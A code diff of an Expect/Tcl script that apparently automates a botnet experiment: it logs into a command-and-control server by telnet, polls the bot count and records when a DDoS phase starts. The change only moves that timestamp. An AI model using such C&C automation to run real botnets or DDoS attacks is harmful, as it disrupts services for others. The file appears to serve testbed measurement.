@@ -21,6 +21,14 @@ puts $outputTransferFile "False"
 close $outputTransferFile
 
 set timeout 300
+
+# Record time finish transfer and start to DDoS
+set DATE [exec date +%s]
+set outputTimeFile [open $path/$outputTime "w+"]
+puts $outputTimeFile $DATE
+close $outputTimeFile
+
+
 # Connect to CNC Server
 spawn telnet $cnc_ip 23
 send "\r"
@@ -38,11 +46,6 @@ send "botcount\r"
 while { $flag < 1 } {
     # puts $flag
     expect ":	$numOfBots" {
-        # Record time finish transfer and start to DDoS
-        set DATE [exec date +%s]
-        set outputTimeFile [open $path/$outputTime "w+"]
-        puts $outputTimeFile $DATE
-        close $outputTimeFile
 
         set outputTransferFile [open $path/$transferFinishedFile "w+"]
         puts $outputTransferFile "True"
